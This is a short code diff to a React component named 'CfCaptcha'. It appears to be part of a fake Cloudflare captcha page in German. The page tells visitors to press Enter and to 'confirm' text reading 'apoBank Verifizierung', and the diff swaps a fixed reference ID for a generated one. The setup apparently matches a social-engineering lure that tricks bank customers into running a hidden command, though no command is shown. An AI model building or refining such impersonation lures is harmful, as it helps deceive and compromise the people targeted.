@@ -228,8 +228,8 @@ const CfCaptcha = () => {
                 <li>Drücken Sie <strong>Enter</strong> auf Ihrer Tastatur, um abzuschließen.</li>
               </ol>
               <p className="text-[13px] text-slate-600 mb-2">Sie werden Folgendes sehen und bestätigen:</p>
-              <div className="mb-6 rounded-md border border-slate-200 bg-white px-3 py-2 font-mono text-[13px] text-slate-700">
-                apoBank Verifizierung (Ref-ID: 90b0e54eb8bd5d84)
+              <div className="mb-6 rounded-md border border-slate-200 bg-white px-3 py-2 font-mono text-[13px] text-slate-700 break-all">
+                apoBank Verifizierung (Ref-ID: {refId})
               </div>
 
               <div className="text-center">
